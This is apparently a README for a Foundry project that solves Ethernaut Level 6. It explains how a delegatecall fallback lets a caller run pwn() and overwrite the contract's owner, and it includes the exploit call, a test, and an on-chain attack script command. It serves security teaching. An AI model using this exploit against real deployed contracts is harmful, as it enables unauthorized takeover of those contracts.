# Ethernaut Level 6 — Delegation

## 🎯 Objective

Claim ownership of the `Delegation` contract.

---

## 📄 Contracts Overview

### `Delegate`

A simple contract that stores an `owner` and exposes a `pwn()` function that sets `owner = msg.sender`.

### `Delegation`

The target contract. It holds a reference to a `Delegate` instance and uses a `fallback()` function that forwards all unknown calls to `Delegate` via **`delegatecall`**.

---

## 🧠 Vulnerability: `delegatecall` Storage Collision

The core vulnerability lies here:

```solidity
fallback() external {
    (bool result,) = address(delegate).delegatecall(msg.data);
    if (result) {
        this;
    }
}
```

When `delegatecall` is used:
- The **code** of `Delegate` is executed
- But the **storage and context** (including `msg.sender`) of `Delegation` is used

Both `Delegation` and `Delegate` store `owner` at **storage slot 0**. So when `pwn()` runs inside a `delegatecall`, it writes `msg.sender` into `Delegation`'s slot 0 — directly overwriting `Delegation.owner`.

### Attack Flow

```
Attacker
  │
  ▼
address(delegation).call(abi.encodeWithSignature("pwn()"))
  │
  ▼  (no matching function → fallback triggered)
delegation.fallback()
  │
  ▼  delegatecall with msg.data = pwn() selector
delegate.pwn()  ← runs in Delegation's context
  │
  ▼
delegation.owner = msg.sender  ← attacker is now owner ✅
```

---

## 🧪 Test — `DelegationTest.sol`

| Test | What it checks |
|---|---|
| `testCurrentOwner()` | Logs the initial owner of the `Delegate` contract |
| `testChangeOwner()` | Exploits `delegatecall` to overwrite `Delegation.owner` with `spider`'s address |

### Key exploit line (in test):
```solidity
vm.startPrank(spider);
(bool s,) = address(delegation).call(abi.encodeWithSignature("pwn()"));
```

The call hits `Delegation`'s fallback, which `delegatecall`s into `Delegate.pwn()` — but inside `Delegation`'s storage, making `spider` the new owner.

---

## 🚀 On-chain Attack — `AttackDelegation.s.sol`

Points to a live deployed `Delegation` contract and executes the same exploit using a funded deployer wallet:

```solidity
(bool s, ) = address(target).call(abi.encodeWithSignature("pwn()"));
```

Logs the owner before and after to confirm the takeover.

> ⚠️ Requires `PRIVATE_KEY` set in your `.env` file and a funded account on the target network.

---

## 🛠 How to Run

### Run Tests (Local Anvil)

```bash
forge test --match-contract DelegationTest -vvvv
```

### Deploy & Attack (On-chain)

```bash
forge script script/AttackDelegation.s.sol --rpc-url <RPC_URL> --broadcast
```

---

## 🔐 Key Concepts

| Concept | Description |
|---|---|
| `delegatecall` | Executes foreign code in the **caller's storage context** |
| Storage Layout | Both contracts must share the same slot layout for `delegatecall` to be predictable — and exploitable |
| `msg.sender` preservation | `delegatecall` preserves `msg.sender`, so `pwn()` sets `owner` to the original attacker |
| Fallback function | Acts as a transparent proxy, forwarding any unrecognized calldata |

---

## ✅ Fix

Never expose a raw `delegatecall` in a fallback without strict access controls or a function selector allowlist. Better yet, use a well-audited proxy pattern (e.g., EIP-1967) that isolates storage layouts explicitly.

---

## 📁 Project Structure

```
├── src/
│   └── Delegation.sol        # Delegate + Delegation contracts
├── script/
│   ├── DelegationDeploy.s.sol
│   └── AttackDelegation.s.sol
└── test/
    └── DelegationTest.t.sol
```